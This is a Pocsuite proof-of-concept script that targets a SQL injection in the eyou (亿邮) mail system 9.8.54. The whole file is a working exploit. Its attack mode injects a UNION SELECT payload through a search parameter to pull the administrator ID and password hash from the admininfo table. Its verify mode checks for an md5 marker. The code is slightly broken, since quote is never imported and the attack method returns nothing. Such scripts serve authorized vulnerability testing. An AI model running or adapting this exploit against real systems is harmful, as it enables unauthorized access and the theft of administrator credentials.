#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import requests


class TestPOC(POCBase):
    name = 'eyou--SQL Injection Attack'
    vulID = ''
    author = ['black']
    vulType = 'SQL Injection Attack'
    version = '1.0'    # default version: 1.0
    references = ['https://www.seebug.org/vuldb/ssvid-89058']
    desc = '''
		   eyou直接从cookie参数中获取用户名传入数据库未对用户输入参数过滤完全导致sql注入。
		   '''
    vulDate = ''
    createDate = '2020-02-07'
    updateDate = '2020-02-07'
    appName = '亿邮'
    appVersion = '9.8.54'
    appPowerLink = ''
    samples = ['']
    
    def _attack(self):
        '''attack mode'''
        result = {}
        vul_url = '%s/user/?q=help&type=search&page=1&kw=' % self.url
        payload = '") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(SELECT CONCAT(0x2d2d2d,IFNULL' \
                  '(CAST(admin_id AS CHAR),0x20),0x2d2d2d,IFNULL(CAST(admin_pass AS CHAR),0x20' \
                  '),0x2d2d2d) FROM filter.admininfo LIMIT 0,1),NULL#'
        payload_v = '") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,md5(360213360213),NULL#'
        match_data = re.compile('did=---(.*)---([\w\d]{32,32})---')
        try:
            response = requests.get(vul_url + quote(payload)).text
        except:
            return
        # response = urllib2.urlopen(vul_url + urllib2.quote(payload)).read()
        data = match_data.findall(response)
        if data:
            # {name: 'AdminInfo'，     value: '管理员信息'},
            # {name: 'Uid'，           value: '管理员ID'},
            # {name: 'Username'，      value: '管理员用户名'},
            # {name: 'Password'，      value: '管理员密码'},
            result["AdminInfo"] = {}
            result['AdminInfo']["Username"] = data[0][0]
            result['AdminInfo']['Password'] = data[0][1]

    def _verify(self):
        '''verify mode'''
        result = {}
        vul_url = '%s/user/?q=help&type=search&page=1&kw=' % self.url
        payload = '") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(SELECT CONCAT(0x2d2d2d,IFNULL' \
                  '(CAST(admin_id AS CHAR),0x20),0x2d2d2d,IFNULL(CAST(admin_pass AS CHAR),0x20' \
                  '),0x2d2d2d) FROM filter.admininfo LIMIT 0,1),NULL#'
        payload_v = '") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,md5(360213360213),NULL#'
        match_data = re.compile('did=---(.*)---([\w\d]{32,32})---')
        try:
            response = requests.get(vul_url + quote(payload_v)).text
        except Exception as e:
            return self.parse_output(result)
        if '5d975967029ada386ba2980a04b7720e' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)